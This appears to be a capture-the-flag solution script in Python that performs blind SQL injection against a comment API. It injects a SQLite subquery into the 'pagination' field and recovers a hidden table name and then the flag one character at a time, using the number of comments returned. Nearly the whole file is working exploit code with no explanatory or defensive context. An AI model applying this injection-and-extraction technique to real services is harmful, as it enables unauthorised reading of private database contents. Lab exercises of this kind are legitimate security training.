import requests 

basename = "http://94.237.59.24:41458/api/comment/submit"

#preparing comment list
for i in range(0,256):
	break
	response = requests.post(basename, json={"submissionID":11,"commentContent":"get_pwned"})
	#print(response.text)
	
#exfiltrating the table's name, flag_XXXXXXXX
basename = "http://94.237.59.24:41458/api/comment/entries"
base = 6
table_name = "flag_"
for i in range(0,8):
	params = {"submissionID":11,"pagination":"(select unicode(substr(tbl_name," + str(base + i) + ",1)) from sqlite_master WHERE tbl_name LIKE 'flag%' LIMIT 1)"}
	response = requests.post(basename, json=params)
	table_name = table_name + chr(response.text.count("content"))
	
print(table_name)

#Exfiltrating the flag using the same trick as before!
flag = ""
for i in range(0,255):
	params = {"submissionID":11,"pagination":"(select unicode(substr(flag," + str(i) + ",1)) from " + table_name + " WHERE flag LIKE 'H%' LIMIT 1)"}
	response = requests.post(basename, json=params)
	flag = flag + chr(response.text.count("content"))
	print("*** Character exfiltrated: " + chr(response.text.count("content")))
	if chr(response.text.count("content")) == "}":
		break
	
print(flag)
	
